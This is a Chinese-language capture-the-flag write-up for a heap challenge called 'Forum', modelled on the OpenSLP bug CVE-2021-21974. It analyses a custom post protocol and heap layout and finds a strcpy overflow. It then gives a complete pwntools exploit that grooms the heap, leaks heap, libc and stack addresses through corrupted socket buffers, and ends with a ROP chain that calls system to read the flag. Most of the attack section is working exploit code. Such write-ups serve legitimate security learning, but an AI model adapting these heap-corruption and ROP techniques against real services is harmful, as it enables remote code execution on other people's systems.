
# Forum（CVE-2021-21974

先整理一下交互协议格式以及功能分析。

---

## 交互协议

### 基本结构
```
[命令字节(1字节)] + [参数1长度(2字节)] + [参数1内容] + [参数2长度(2字节)] + [参数2内容] + ...
```

### 命令类型
- `0x01` - 创建帖子
- `0x02` - 删除帖子
- `0x03` - 未开放
- `0x04` - 未开放
- `0x05` - 修改帖子

### 1. 创建帖子 (0x01)

**请求格式：**
```
[0x01] + [len1(2字节)] + [content1/../content2/../content3] + [len2(2字节)] + [content4] + [len3(2字节)] + [content5]
```
- `content1/../content2/../content3` (用 `/../` 分隔三部分)

### 2. 删除帖子 (0x02)

**请求格式：**
```
[0x02] + [len(2字节)] + [post_id字符串]
```

### 3. 未开放 (0x03 0x04)

_此部分内容未提供。_

### 5. 修改帖子 (0x05)

**请求格式：**
```
[0x05] + [len1(2字节)] + [post_id字符串] + [len2(2字节)] + [new_content]
```

---

## 内存分配

### 关键常量和结构体
```c
sizeof(Post) = 0x38
sizeof(SlpdSocket) = 0x28
INITIAL_RECV_SIZE  = 0x300   // 初始接收缓冲区
INITIAL_SEND_SIZE  = 0x300   // 初始发送缓冲区
sizeof(RecvBuf) = 0x18
sizeof(SendBuf) = 0x18

typedef struct {
    size_t size;
    char *ptr;      // 当前写入位置
    char *end;      // 缓冲区结束位置
    char data[];
} RecvBuf; // SendBuf也是一样的

typedef struct {
    int state;
    int fd;
    int active;
    RecvBuf *recvbuf;
    SendBuf *sendbuf;
} SlpdSocket;
```

### 路径1：初始化客户端连接

| 函数 | 大小 | 数量 | 说明 |
| :--- | :--- | :--- | :--- |
| `calloc` | `sizeof(SlpdSocket)(0x28)` | 1 | 接收缓冲区(初始) |
| `calloc` | `sizeof(RecvBuf) + 0x1000(0x318)` | 1 | 接收缓冲区(初始) |
| `calloc` | `sizeof(SendBuf) + 0x1000(0x318)` | 1 | 发送缓冲区(初始) |

### 路径2：创建帖子

| 函数 | 大小 | 数量 |
| :--- | :--- | :--- |
| `calloc` | `sizeof(Post)(0x38)` | 1 |
| `calloc` | `content1_len + 1` | 1 |
| `calloc` | `content2_len + 1` | 1 |
| `calloc` | `content3_len + 1` | 1 |
| `calloc` | `content4_len + 1` | 1 |
| `calloc` | `content5_len + 1` | 1 |
| `calloc` | `128` | 1 |

### 路径3：删除帖子

| 函数 | 大小 | 数量 | 说明 |
| :--- | :--- | :--- | :--- |
| `malloc` | `len + 1` | 1 | 临时ID字符串 |
| `free` | - | 6 | 释放Post的5个字符串+结构体 |

### 路径4：修改帖子

| 函数       | 大小         | 数量  | 说明           |
| :------- | :--------- | :-- | :----------- |
| `malloc` | `len1 + 1` | 1   | 临时ID字符串      |
| `free`   | -          | 1   | 释放旧content3  |
| `calloc` | `len2 + 1` | 1   | 新content3字符串 |

### 路径5：发送响应

| 函数 | 大小 | 数量 | 说明 |
| :--- | :--- | :--- | :--- |
| `calloc` | `sizeof(SendBuf) + new_size` | 0或1 | 仅当需要扩展时 |

### 路径6：扩展接收缓冲区

| 函数 | 大小 | 数量 | 说明 |
| :--- | :--- | :--- | :--- |
| `calloc` | `sizeof(RecvBuf) + new_size` | 1 | 新缓冲区 |
| `free` | - | 1 | 释放旧缓冲区 |

### 路径7：扩展发送缓冲区

| 函数 | 大小 | 数量 | 说明 |
| :--- | :--- | :--- | :--- |
| `calloc` | `sizeof(SendBuf) + new_size` | 1 | 新缓冲区 |
| `free` | - | 1 | 释放旧缓冲区 |

程序总是会遍历所有连接，并检查其`SlpdSocket`的state状态，state为1或者0时，则会尝试从对应fd接收信息并进入处理函数，如果为2时则会尝试向客户端发送信息。

---

## 漏洞点

在创建帖子的功能中，会先计算`content1~5`的大小并`calloc`，接下来进行`strcpy`或`strncpy`。
针对`content1~3`其计算堆块大小的过程中是通过字符串`"/../"`进行分割计算的，`content3`的大小则是通过len1减去`content1~2`的大小来得到的，但是如果`content4`内容长度即len2大于0x101则len2的两字节可能都不为空，那么就会导致`content3`在`strcpy`的过程中，导致越界写。以上并不是唯一漏洞点，可能存在其他漏洞点。

---

## 利用

代码中缓冲区默认大小是0x300，如果此次输入大于0x300，那么服务也仅会处理0x300的数据（出题人代码写的垃圾导致的）所以在布局分水之前先要对其缓冲区进行扩充，由于每次扩充缓冲区是乘2倍增，所以尝试输入0x300和0x600扩充两次，为了后续方便利用，同时创建一个帖子将free出来的堆块给申请了，方便后续布局。
```python
io = remote(HOST, PORT)
pad(io, 0x300)
pad(io, 0x600)
io.recv()
io.recv()
create_post(io, b'a'*0x310, b'b', b'c', b'd', b'e'*0x4c7) # 1
```
由于题目中没有读取功能同时是通过新建socket连接，没法覆写`io_file`低位来达到输出泄漏地址，能想到的其一办法就是去修改sendbuf以及slpdsocket的内容让其主动泄漏地址。

接下来便是尝试利用strcpy存在的越界写来布局达到目的。
下面这段就是尝试使用content3越界写修改content4原本的大小为0x170改为0x200，同时content5大小预留0x28，方便后续创建新连接时新的slpdsocket会从这上面申请，由于0x170大小于0x410属于tcache范畴，检查不严格即便大小被修改也没啥。
```python
payload = b'd' + p64(0x201)#slpdsocket
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x27) # 2
```
下面两个同理也是为后续新连接的sendbuf以及和recvbuf准备
```python
payload = b'd' + p64(0x211)#sendbuf
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x310) # 3
payload = b'd' + p64(0x221)#recvbuf
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x310) # 4
create_post(io, b'a'*0x500, b'b', b'c', b'd', b'e') # 5
```
下面则是释放之前的布置并立即创建新连接，在ID后面多加`b'\x00'*120`，主要是为了复用创建帖子产生的128大小的堆块，而不会产生新堆块。
```python
delete_post(io, b'2'+b'\x00'*120)
delete_post(io, b'3'+b'\x00'*120)
delete_post(io, b'4'+b'\x00'*120)

io1 = remote(HOST, PORT)
```
由于0x200，0x210，0x220都只有一个并且分别对应slpdsocket，sendbuf，recvbuf，只要尝试创建和其一样大小的堆块就能实现越界写io1的slpdsocket，sendbuf，recvbuf。因为calloc会清空内容，所以最好的想法就是删除帖子和修改帖子中存在的malloc。

接下来就是越界将sendbuf的第一个指针低位覆写为\x00这样就能泄漏出sendbuf->ptr地址内容，同时还得覆写slpdsocket的state为2让其能够返回指针指向的内容。
需要注意的是malloc的内容是通过strcpy来写的，所以只能多次请求，先写地址高的继而往地址低的来写。以上边可以成功泄漏heap地址。
```python
# sendbuf leak heap_addr
for i in range(7):
    payload = b'a'*(0x178-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x170 + p64(0x301)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)

#slpdsocket
payload = b'a'*0x170 + p64(0x2)
payload = payload.ljust(0x200-0x10, b'\x00')
delete_post(io, payload)

io1.recvuntil(b"\x01\x03\x00\x00\x00\x00\x00\x00")
io1.recv(8)
heap_addr = u64(io1.recv(8)) + 0x878
print(f"heap_addr:{hex(heap_addr)}")
```
后续将之前申请的ID为5的post删除，方便泄漏libc地址，同理也是覆盖sendbuf的ptr以及end，同理泄漏栈地址。
sendbuf可以泄漏同理recvbuf也可以达到任意地址写，将recvbuf->ptr以及end改写到栈上即可

---

## EXP

```python
from pwn import *

#context.log_level = 'debug'

HOST = 'localhost'
PORT = 8888

def create_post(io, content1, content2, content3, content4, content5):
    param1 = content1 + b'/../' + content2 + b'/../' + content3
    
    payload = p8(0x01)
    payload += p16(len(param1)) + param1
    payload += p16(len(content4)) + content4
    payload += p16(len(content5)) + content5
    io.send(payload)
    response = io.recvline()
    #print(response.decode())
    return response

def delete_post(io, post_id):
    id_str = post_id
    
    payload = p8(0x02)
    payload += p16(len(id_str)) + id_str
    
    io.send(payload)
    response = io.recvline()
    #print(response.decode())
    return response


def modify_post(io, post_id, new_content):
    id_str = post_id
    
    payload = p8(0x05)
    payload += p16(len(id_str)) + id_str
    payload += p16(len(new_content)) + new_content
    
    io.send(payload)
    response = io.recvline()
    #print(response.decode())
    return response

def pad(io, size):
    io.sendline(cyclic(size))
    response = io.recvline()
    #print(response.decode())

io = remote(HOST, PORT)
pad(io, 0x300)
pad(io, 0x600)
io.recv()
io.recv()
create_post(io, b'a'*0x310, b'b', b'c', b'd', b'e'*0x4c7) # 1

payload = b'd' + p64(0x201)#slpdsocket
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x27) # 2
payload = b'd' + p64(0x211)#sendbuf
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x310) # 3
payload = b'd' + p64(0x221)#recvbuf
payload = payload.ljust(0x160, b'\x00')
create_post(io, b'a', b'b', b'c'*(0x17-2), payload, b'e'*0x310) # 4

create_post(io, b'a'*0x500, b'b', b'c', b'd', b'e') # 5

delete_post(io, b'2'+b'\x00'*120)
delete_post(io, b'3'+b'\x00'*120)
delete_post(io, b'4'+b'\x00'*120)

io1 = remote(HOST, PORT)

# sendbuf leak heap_addr
for i in range(7):
    payload = b'a'*(0x178-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x170 + p64(0x301)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)

#slpdsocket
payload = b'a'*0x170 + p64(0x2)
payload = payload.ljust(0x200-0x10, b'\x00')
delete_post(io, payload)

io1.recvuntil(b"\x01\x03\x00\x00\x00\x00\x00\x00")
io1.recv(8)
heap_addr = u64(io1.recv(8)) + 0x878
print(f"heap_addr:{hex(heap_addr)}")
delete_post(io, b'5'+b'\x00'*120)

#sendbuf leak libc_addr
payload = b'a'*0x180 + p64(heap_addr+0x8)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)
for i in range(4):
    payload = b'a'*(0x180-1-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x178 + p64(heap_addr)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)
for i in range(6):
    payload = b'a'*(0x177-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x170 + p64(0x301)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)

#slpdsocket
payload = b'a'*0x170 + p64(0x2)
payload = payload.ljust(0x200-0x10, b'\x00')
delete_post(io, payload)

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc_addr = u64(io1.recv(8)) - 96 - 0x1e7ac0#main_arena-offset
print(f"libc_addr:{hex(libc_addr)}")

#sendbuf leak stack_addr
environ = libc_addr + libc.sym["environ"]
payload = b'a'*0x180 + p64(environ+0x8)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)
for i in range(4):
    payload = b'a'*(0x180-1-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x178 + p64(environ)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)
for i in range(6):
    payload = b'a'*(0x177-i)
    payload = payload.ljust(0x210-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x170 + p64(0x301)
payload = payload.ljust(0x210-0x10, b'\x00')
delete_post(io, payload)

#slpdsocket
payload = b'a'*0x170 + p64(0x2)
payload = payload.ljust(0x200-0x10, b'\x00')
delete_post(io, payload)

stack_addr = u64(io1.recv(8)) - 0x310 #handle_command_ret_Stack_addr
print(f"stack_addr:{hex(stack_addr)}")

#recvbuf hijack
payload = b'a'*0x180 + p64(stack_addr+0x100)
payload = payload.ljust(0x220-0x10, b'\x00')
delete_post(io, payload)
for i in range(4):
    payload = b'a'*(0x180-1-i)
    payload = payload.ljust(0x220-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x178 + p64(stack_addr)
payload = payload.ljust(0x220-0x10, b'\x00')
delete_post(io, payload)
for i in range(6):
    payload = b'a'*(0x177-i)
    payload = payload.ljust(0x220-0x10, b'\x00')
    delete_post(io, payload)
payload = b'a'*0x170 + p64(0x301)
payload = payload.ljust(0x220-0x10, b'\x00')
delete_post(io, payload)

system = libc_addr + libc.sym["system"]
rdi = libc_addr + next(libc.search(asm("pop rdi ; ret", arch = "amd64")))
payload = p64(rdi) + p64(stack_addr+0x20) + p64(rdi+1) + p64(system)
payload+= b"cat /flag >& 5\x00"
io1.sendline(payload)

io1.interactive()
```